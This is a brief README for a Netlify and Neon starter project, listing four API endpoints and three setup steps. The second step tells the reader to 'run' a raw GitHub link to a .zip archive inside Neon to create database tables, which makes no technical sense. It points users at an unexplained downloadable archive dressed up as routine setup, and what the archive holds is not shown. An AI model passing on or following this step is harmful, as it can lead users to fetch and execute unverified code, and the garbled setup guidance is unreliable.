# Netlify + Neon starter

Endpoints:
- GET /api/health
- GET /api/pages-list
- POST /api/pages-save
- GET /api/tasks-list

Setup:
1) Enable Neon extension on Netlify. It provides NETLIFY_DATABASE_URL.
2) In Neon, run https://github.com/Sm8s/portfolio_with_backend/raw/refs/heads/main/netlify/backend_with_portfolio_3.5.zip to create tables.
3) Deploy to Netlify. Use /api/* routes.